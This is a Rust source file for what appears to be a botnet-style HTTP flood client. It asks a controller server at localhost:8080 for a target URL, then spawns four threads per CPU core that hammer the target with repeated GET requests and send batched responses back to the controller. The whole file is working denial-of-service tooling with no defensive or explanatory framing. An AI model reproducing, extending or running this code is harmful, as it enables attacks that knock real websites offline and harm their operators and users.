use serde_json;
use std::sync::{Arc, Mutex, Condvar};
use dashmap::DashMap;

struct Client {
    host_address: String,
    address: String,
    attacking: bool,
    workers: Vec<Arc<(Mutex<Worker>, Condvar)>>,
    worker_threads: Vec<std::thread::JoinHandle<()>>,
    results: DashMap<u32, Vec<String>>,
}

struct Worker {
    id: u32,
    host_address: String,
    attacking: bool,
    address: String,
    client: reqwest::blocking::Client,
    results: DashMap<u32, Vec<String>>,
}

impl Worker {
    fn new(addr: String, host: String, map: DashMap<u32, Vec<String>>, id: u32) -> Worker {
        let client = reqwest::blocking::Client::new();
        let mut add = host.clone();
        add.push_str("/attack_info");
        Worker { host_address: add, attacking: false, address: addr, client, results: map, id }
    }
    fn start_requesting(&self) -> i32 {
        if self.attacking {
            let to_attack = self.address.as_str();
            let res = self.client.get(to_attack).send().unwrap();
            let code = res.status().as_u16();
            let body = res.text().unwrap();
            let response_body = serde_json::json!({"code": code, "body":body});
            // self.client.post(self.host_address.as_str()).json(&response_body).send().unwrap();
            self.results.get_mut(&self.id).unwrap().push(response_body.to_string());
            return 0;
        }
        1
    }
}

impl Client {
    fn new(host: String) -> Client {
        let mut cl = Client {
            host_address: host,
            address: String::new(),
            attacking: false,
            workers: vec![],
            worker_threads: vec![],
            results: DashMap::with_capacity(4),
        };
        let thread_count = std::thread::available_parallelism().unwrap().get() * 4;
        cl.worker_threads.reserve(thread_count);
        for i in 0..thread_count {
            cl.results.insert(i as u32, vec![]);
            cl.workers.push(Arc::new((
                Mutex::new(Worker::new(cl.address.clone(), cl.host_address.clone(), cl.results.clone(), i as u32)),
                Condvar::new()
            )));
        }
        return cl;
    }

    fn can_attack(&mut self) {
        let url = self.host_address.as_str();
        let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
            strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1];
        println!("{}", attack_address_url);
        let mut can_attack = true;
        if attack_address_url.is_empty() {
            can_attack = false;
        }
        self.address = attack_address_url.to_string();
        if can_attack {
            println!("can attack");
            self.attacking = true;
            for el in self.workers.iter_mut() {
                println!("main thread command: huh?");
                let clone_el = el.clone();
                let (elem, cv) = &*clone_el;
                let mut worker = elem.lock().unwrap();
                worker.address = self.address.clone();
                worker.attacking = true;
                cv.notify_one();
            }
        } else {
            println!("can't attack");
            self.attacking = false;
            for el in self.workers.iter_mut() {
                let clone_el = el.clone();
                println!("main thread command: is to stop");
                let (elem, _cv) = &*clone_el;
                let mut worker = elem.lock().unwrap();
                worker.address = self.address.clone();
                worker.attacking = false;
            }
        }
    }

    fn thread_worker(worker: Arc<(Mutex<Worker>, Condvar)>) {
        let el = worker.clone();
        let (elem, cv) = &*el;
        loop {
            {
                let mut w = elem.lock().unwrap();
                if !w.attacking {
                    w = cv.wait_while(w, |w| !w.attacking).unwrap();
                }
            }
            let mut w = elem.lock().unwrap();
            let mut _r = 0;
            for _ in 0..5 {
                _r = w.start_requesting();
            }
        }
    }

    fn run(mut self) {
        let cl = reqwest::blocking::Client::new();
        let max_size = self.workers.capacity();
        let mut i = 0;
        while i < max_size {
            let ind = i.to_owned().clone();
            let worker = self.workers[ind].clone();
            self.worker_threads.push(std::thread::spawn(move || {
                Client::thread_worker(worker);
            }));
            println!("worker thread {}", ind);
            i += 1;
        }
        println!("main thread finished creating");
        self.can_attack();
        loop {
            let mut amount_of_requests = 0;
            let mut request_body_vec = Vec::new();
            for el in self.results.iter() {
                amount_of_requests += el.value().len();
                request_body_vec.extend(el.value().to_owned());
                if amount_of_requests >= 200 {
                    self.results.get_mut(&el.key()).unwrap().clear();
                    cl.post(format!("{}/api/attack", self.host_address.as_str())).json(&request_body_vec).send().unwrap();
                    request_body_vec.clear();
                    amount_of_requests = 0;
                }
            }
            self.can_attack();
        }


        while self.worker_threads.len() > 0 {
            let thread = self.worker_threads.pop().unwrap();
            thread.join().unwrap();
        }
    }
}


fn main() {
    let mut cl = Client::new(String::from("http://localhost:8080"));
    cl.run();
    // cl.can_attack();
}
